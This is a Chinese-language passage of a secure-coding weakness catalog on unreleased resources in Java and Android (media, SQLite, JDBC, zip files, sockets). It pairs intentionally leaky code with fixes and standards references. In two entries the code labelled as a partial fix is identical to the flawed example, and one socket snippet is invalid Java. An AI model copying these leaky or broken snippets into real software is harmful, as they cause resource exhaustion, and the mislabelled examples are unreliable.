@Override</span><br><span class="line"></span><br><span class="line">  public void onStop() &#123;</span><br><span class="line"></span><br><span class="line">      mp.stop();</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-87"><a href="#RECOMMENDATIONS-87" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>如果应用程序使用 Android 的媒体功能，则必须替代活动的 onPause() 方法，以及 onStop() 和 onDestroy() 中的至少一种方法。对于每个方法，请确保调用媒体对象上的 release() 以节省系统资源。释放媒体实例后，可通过在 onResume() 回调中重新配置和重新获取该实例来继续使用 Android 的媒体功能。</p>
<p>此外，在应用程序执行过程中，如果在一段时间内不使用媒体实例，将其释放通常不失为一个好方法。当应用程序再次需要该资源时，按上述方法重新配置和重新获取即可。</p>
<h5 id="REFERENCES-84"><a href="#REFERENCES-84" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Media Player, Android Developers</p>
<p>[2] Audio Capture, Android Developers</p>
<p>[3] FIO04-J. Release resources when they are no longer needed CERT</p>
<p>[4] DOS-2: Release resources in all cases Oracle</p>
<p>[5] Standards Mapping - Common Weakness Enumeration CWE ID 404, CWE ID 619</p>
<p>[6] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-5 Denial of Service Protection (P1)</p>
<p>[7] Standards Mapping - OWASP Top 10 2004 A9 Application Denial of Service</p>
<p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.9</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.6</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.6</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.6</p>
<p>[12] Standards Mapping - SANS Top 25 2009 Risky Resource Management - CWE ID 404</p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP6080 CAT II</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP6080 CAT II</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP6080 CAT II</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP6080 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP6080 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP6080 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP6080 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002400 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002400 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002400 CAT II</p>
<p>[23] Standards Mapping - Web Application Security Consortium 24 + 2 Denial of Service</p>
<p>[24] Standards Mapping - Web Application Security Consortium Version 2.00 Denial of Service (WASC-10)</p>
<h4 id="Unreleased-Resource-Android-SQLite-Database"><a href="#Unreleased-Resource-Android-SQLite-Database" class="headerlink" title="Unreleased Resource: Android SQLite Database"></a>Unreleased Resource: Android SQLite Database</h4><h5 id="ABSTRACT-86"><a href="#ABSTRACT-86" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>Android 活动未能在其 onPause()、onStop() 或 onDestroy() 事件处理器中释放 Android 数据库处理器。</p>
<h5 id="EXPLANATION-87"><a href="#EXPLANATION-87" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>Android 活动维护了在 onPause()、onStop() 或 onDestroy() 回调中未关闭的 Android SQLite 数据库处理器。当 Android OS 需要将当前活动发送到后台或在系统资源不足时暂时中断活动时，会调用这些回调函数。由于未能正确关闭数据库，如果活动不断重启，则可能会耗尽可用的游标。此外，根据实现方法不同，Android 操作系统也可能抛出异常 DatabaseObjectNotClosedException。如果未能捕获此异常，应用程序将会崩溃。</p>
<p>示例：以下代码描述了在停止时会缓存用户数据并写入磁盘的 Android 活动。请注意，该活动没有替代用于释放数据库对象的基本 onPause() 方法，也没有在关机顺序中正确释放该对象。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">public class MyDBHelper extends SQLiteOpenHelper &#123;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">public class UnreleasedDBActivity extends Activity &#123;</span><br><span class="line"></span><br><span class="line">  private myDBHelper dbHelper;</span><br><span class="line"></span><br><span class="line">  private SQLiteDatabase db;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  @Override</span><br><span class="line"></span><br><span class="line">  public void onCreate(Bundle state) &#123;</span><br><span class="line"></span><br><span class="line">      ...</span><br><span class="line"></span><br><span class="line">      db = dbHelper.getWritableDatabase();</span><br><span class="line"></span><br><span class="line">      ...</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  @Override</span><br><span class="line"></span><br><span class="line">  public void onRestart() &#123;</span><br><span class="line"></span><br><span class="line">      ...</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  @Override</span><br><span class="line"></span><br><span class="line">  public void onStop() &#123;</span><br><span class="line"></span><br><span class="line">      db.insert(cached_data);     // flush cached data</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-88"><a href="#RECOMMENDATIONS-88" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>如果应用程序使用 SQLite 数据库，则必须替代活动的 onPause() 方法，以及 onStop() 和 onDestroy() 中的至少一种方法。对于每个方法来说，请确保调用数据库处理器或对象上的 close() 以节省系统资源。调用数据库上的 close() 后，可通过在 onResume() 回调中重新配置和重新获取该实例来继续使用 Android 的 SQLite 存储功能。</p>
<p>此外，在应用程序执行过程中，如果在一段时间内不使用数据库对象，将其关闭通常不失为一个好方法。当应用程序再次需要该资源时，按上述方法重新配置和重新获取即可。</p>
<h5 id="REFERENCES-85"><a href="#REFERENCES-85" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Data Storage, Android Developers</p>
<p>[2] FIO04-J. Release resources when they are no longer needed CERT</p>
<p>[3] DOS-2: Release resources in all cases Oracle</p>
<p>[4] Standards Mapping - Common Weakness Enumeration CWE ID 404, CWE ID 619</p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-5 Denial of Service Protection (P1)</p>
<p>[6] Standards Mapping - OWASP Top 10 2004 A9 Application Denial of Service</p>
<p>[7] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.9</p>
<p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.6</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.6</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.6</p>
<p>[11] Standards Mapping - SANS Top 25 2009 Risky Resource Management - CWE ID 404</p>
<p>[12] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP6080 CAT II</p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP6080 CAT II</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP6080 CAT II</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP6080 CAT II</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP6080 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP6080 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP6080 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002400 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002400 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002400 CAT II</p>
<p>[22] Standards Mapping - Web Application Security Consortium 24 + 2 Denial of Service</p>
<p>[23] Standards Mapping - Web Application Security Consortium Version 2.00 Denial of Service (WASC-10)</p>
<h4 id="Unreleased-Resource-Database"><a href="#Unreleased-Resource-Database" class="headerlink" title="Unreleased Resource: Database"></a>Unreleased Resource: Database</h4><h5 id="ABSTRACT-87"><a href="#ABSTRACT-87" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>程序可能无法释放某个数据库资源。</p>
<h5 id="EXPLANATION-88"><a href="#EXPLANATION-88" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>资源泄露至少有两种常见的原因：</p>
<p>－ 错误状况及其他异常情况。</p>
<p>－ 未明确程序的哪一部份负责释放资源。</p>
<p>大部分 Unreleased Resource 问题只会导致一般的软件可靠性问题，但如果攻击者能够故意触发资源泄漏，该攻击者就有可能通过耗尽资源池的方式发起 denial of service 攻击。</p>
<p>示例：在正常条件下，以下代码会执行数据库查询指令，处理数据库返回的结果，并关闭已分配的指令对象。但如果在执行 SQL 或是处理结果时发生异常，指令对象将不会关闭。如果这种情况频繁出现，数据库将用完所有可用的指针，且不能再执行任何 SQL 查询。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Statement stmt = conn.createStatement();</span><br><span class="line"></span><br><span class="line">ResultSet rs = stmt.executeQuery(CXN_SQL);</span><br><span class="line"></span><br><span class="line">harvestResults(rs);</span><br><span class="line"></span><br><span class="line">stmt.close();</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-89"><a href="#RECOMMENDATIONS-89" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><ol>
<li>请不要依赖 finalize() 回收资源。为了使对象的 finalize() 方法能被调用，垃圾收集器必须确认对象符合垃圾回收的条件。但是垃圾收集器只有在 JVM 内存过小时才会使用。因此，无法保证何时能够调用该对象的 finalize() 方法。垃圾收集器最终运行时，可能出现这样的情况，即在短时间内回收大量的资源，这种情况会导致“突发”性能，并降低总体系统通过量。随着系统负载的增加，这种影响会越来越明显。</li>
</ol>
<p>最后，如果某一资源回收操作被挂起（例如该操作需要通过网络访问数据库），那么执行 finalize() 方法的线程也将被挂起。</p>
<ol>
<li>在 finally 代码段中释放资源。示例中的代码可按以下方式改写：</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">  public void execCxnSql(Connection conn) &#123;</span><br><span class="line"></span><br><span class="line">    Statement stmt;</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line"></span><br><span class="line">      stmt = conn.createStatement();</span><br><span class="line"></span><br><span class="line">      ResultSet rs = stmt.executeQuery(CXN_SQL);</span><br><span class="line"></span><br><span class="line">      ...</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    finally &#123;</span><br><span class="line"></span><br><span class="line">      if (stmt != null) &#123;</span><br><span class="line"></span><br><span class="line">        safeClose(stmt);</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">public static void safeClose(Statement stmt) &#123;</span><br><span class="line"></span><br><span class="line">  if (stmt != null) &#123;</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line"></span><br><span class="line">      stmt.close();</span><br><span class="line"></span><br><span class="line">    &#125; catch (SQLException e) &#123;</span><br><span class="line"></span><br><span class="line">      log(e);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>以上方案使用了一个助手函数，用以记录在尝试关闭指令时可能产生的异常。该助手函数大约会在需要关闭指令时重新使用。</p>
<p>同样，execCxnSql 方法不会将 stmt 对象初始化为 null。而是进行检查，以确保调用 safeClose() 之前，stmt 不是 null。如果没有检查 null，Java 编译器会报告 stmt 可能没有进行初始化。编译器做出这一判断源于 Java 可以检测未初始化的变量。如果用一种更加复杂的方法将 stmt 初始化为 null，那么编译器就无法检测 stmt 未经初始化便使用的情况。</p>
<h5 id="REFERENCES-86"><a href="#REFERENCES-86" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] FIO04-J. Release resources when they are no longer needed CERT</p>
<p>[2] DOS-2: Release resources in all cases Oracle</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 404</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-5 Denial of Service Protection (P1)</p>
<p>[5] Standards Mapping - OWASP Top 10 2004 A9 Application Denial of Service</p>
<p>[6] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.9</p>
<p>[7] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.6</p>
<p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.6</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.6</p>
<p>[10] Standards Mapping - SANS Top 25 2009 Risky Resource Management - CWE ID 404</p>
<p>[11] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP6080 CAT II</p>
<p>[12] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP6080 CAT II</p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP6080 CAT II</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP6080 CAT II</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP6080 CAT II</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP6080 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP6080 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002400 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002400 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002400 CAT II</p>
<p>[21] Standards Mapping - Web Application Security Consortium 24 + 2 Denial of Service</p>
<p>[22] Standards Mapping - Web Application Security Consortium Version 2.00 Denial of Service (WASC-10)</p>
<h4 id="Unreleased-Resource-Files"><a href="#Unreleased-Resource-Files" class="headerlink" title="Unreleased Resource: Files"></a>Unreleased Resource: Files</h4><h5 id="ABSTRACT-88"><a href="#ABSTRACT-88" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>程序可能无法释放某个文件句柄。</p>
<h5 id="EXPLANATION-89"><a href="#EXPLANATION-89" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>程序可能无法释放某个文件句柄。</p>
<p>资源泄露至少有两种常见的原因：</p>
<p>－ 错误状况及其他异常情况。</p>
<p>－ 未明确程序的哪一部份负责释放资源。</p>
<p>大部分 Unreleased Resource 问题只会导致一般的软件可靠性问题，但如果攻击者能够故意触发资源泄漏，该攻击者就有可能通过耗尽资源池的方式发起 denial of service 攻击。</p>
<p>例 1：下面的方法绝不会关闭它所打开的文件句柄。ZipFile 中的 finalize() 方法最终会调用 close()，但是不能确定何时会调用 finalize() 方法。在繁忙的环境中，这会导致 JVM 用尽它所有的文件句柄。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">public void printZipContents(String fName)</span><br><span class="line"></span><br><span class="line">    throws ZipException, IOException, SecurityException, IllegalStateException, NoSuchElementException</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  ZipFile zf = new ZipFile(fName);</span><br><span class="line"></span><br><span class="line">  Enumeration&lt;ZipEntry&gt; e = zf.entries();</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  while (e.hasMoreElements()) &#123;</span><br><span class="line"></span><br><span class="line">    printFileInfo(e.nextElement());</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>例 2：正常情况下，以下修复代码会在输出所有 zip 文件条目之后正常关闭文件句柄。如果迭代这些条目时出现异常，则不会关闭 zip 文件句柄。如果这种情况经常出现，JVM 就可能耗尽所有可用的文件句柄。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">public void printZipContents(String fName)</span><br><span class="line"></span><br><span class="line">    throws ZipException, IOException, SecurityException, IllegalStateException, NoSuchElementException</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  ZipFile zf = new ZipFile(fName);</span><br><span class="line"></span><br><span class="line">  Enumeration&lt;ZipEntry&gt; e = zf.entries();</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  while (e.hasMoreElements()) &#123;</span><br><span class="line"></span><br><span class="line">    printFileInfo(e.nextElement());</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-90"><a href="#RECOMMENDATIONS-90" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><ol>
<li>请不要依赖 finalize() 回收资源。为了使对象的 finalize() 方法能被调用，垃圾收集器必须确认对象符合垃圾回收的条件。但是垃圾收集器只有在 JVM 内存过小时才会使用。因此，无法保证何时能够调用该对象的 finalize() 方法。垃圾收集器最终运行时，可能出现这样的情况，即在短时间内回收大量的资源，这种情况会导致“突发”性能，并降低总体系统通过量。随着系统负载的增加，这种影响会越来越明显。</li>
</ol>
<p>最后，如果某一资源回收操作被挂起（例如该操作需要通过网络进行通信），那么执行 finalize() 方法的线程也将被挂起。</p>
<ol>
<li>在 finally 代码段中释放资源。例 2 中的代码可按以下方式改写：</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">public void printZipContents(String fName)</span><br><span class="line"></span><br><span class="line">    throws ZipException, IOException, SecurityException, IllegalStateException, NoSuchElementException</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  ZipFile zf;</span><br><span class="line"></span><br><span class="line">  try &#123;</span><br><span class="line"></span><br><span class="line">    zf = new ZipFile(fName);</span><br><span class="line"></span><br><span class="line">    Enumeration&lt;ZipEntry&gt; e = zf.entries();</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  finally &#123;</span><br><span class="line"></span><br><span class="line">    if (zf != null) &#123;</span><br><span class="line"></span><br><span class="line">      safeClose(zf);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">public static void safeClose(ZipFile zf) &#123;</span><br><span class="line"></span><br><span class="line">  if (zf != null) &#123;</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line"></span><br><span class="line">      zf.close();</span><br><span class="line"></span><br><span class="line">    &#125; catch (IOException e) &#123;</span><br><span class="line"></span><br><span class="line">      log(e);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>以上方案使用了一个助手函数，用以记录在尝试关闭文件时可能产生的异常。该助手函数大约会在需要关闭文件时重新使用。</p>
<p>同样，printZipContents 方法不会将 zf 对象初始化为 null。而是进行检查，以确保调用 safeClose() 之前，zf 不是 null。如果没有检查 null，Java 编译器会报告 zf 可能没有进行初始化。编译器做出这一判断源于 Java 可以检测未初始化的变量。如果用一种更加复杂的方法将 zf 初始化为 null，那么编译器就无法检测 zf 未经初始化便使用的情况。</p>
<h5 id="REFERENCES-87"><a href="#REFERENCES-87" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] FIO04-J. Release resources when they are no longer needed CERT</p>
<p>[2] DOS-2: Release resources in all cases Oracle</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 404</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-5 Denial of Service Protection (P1)</p>
<p>[5] Standards Mapping - OWASP Top 10 2004 A9 Application Denial of Service</p>
<p>[6] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.9</p>
<p>[7] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.6</p>
<p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.6</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.6</p>
<p>[10] Standards Mapping - SANS Top 25 2009 Risky Resource Management - CWE ID 404</p>
<p>[11] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP6080 CAT II</p>
<p>[12] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP6080 CAT II</p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP6080 CAT II</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP6080 CAT II</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP6080 CAT II</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP6080 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP6080 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002400 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002400 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002400 CAT II</p>
<p>[21] Standards Mapping - Web Application Security Consortium 24 + 2 Denial of Service</p>
<p>[22] Standards Mapping - Web Application Security Consortium Version 2.00 Denial of Service (WASC-10)</p>
<h4 id="Unreleased-Resource-Sockets"><a href="#Unreleased-Resource-Sockets" class="headerlink" title="Unreleased Resource: Sockets"></a>Unreleased Resource: Sockets</h4><h5 id="ABSTRACT-89"><a href="#ABSTRACT-89" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>程序可能无法释放某个套接字。</p>
<h5 id="EXPLANATION-90"><a href="#EXPLANATION-90" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>程序可能无法释放某个套接字。</p>
<p>资源泄露至少有两种常见的原因：</p>
<p>－ 错误状况及其他异常情况。</p>
<p>－ 未明确程序的哪一部份负责释放资源。</p>
<p>大部分 Unreleased Resource 问题只会导致一般的软件可靠性问题，但如果攻击者能够故意触发资源泄漏，该攻击者就有可能通过耗尽资源池的方式发起 denial of service 攻击。</p>
<p>例 1：下面的方法绝不会关闭它所打开的套接字。在繁忙的环境中，这会导致 JVM 用尽它所有的套接字。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">private void echoSocket(String host, int port) throws UnknownHostException, SocketException, IOException</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  Socket sock = new Socket(host, port);</span><br><span class="line"></span><br><span class="line">  BufferedReader reader = new BufferedReader(new InputStreamReader(sock.getInputStream()));</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  while ((String socketData = reader.readLine()) != null) &#123;</span><br><span class="line"></span><br><span class="line">    System.out.println(socketData);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>例 2：正常情况下，以下修复代码会正常关闭套接字以及任何相关联的数据流。但如果在读取输入或将数据输出到屏幕时出现异常，则不会关闭套接字对象。如果这种情况经常出现，系统将会耗尽所有套接字，无法处理更多连接。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">private void echoSocket(String host, int port) throws UnknownHostException, SocketException, IOException</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  Socket sock = new Socket(host, port);</span><br><span class="line"></span><br><span class="line">  BufferedReader reader = new BufferedReader(new InputStreamReader(sock.getInputStream()));</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  while ((String socketData = reader.readLine()) != null) &#123;</span><br><span class="line"></span><br><span class="line">    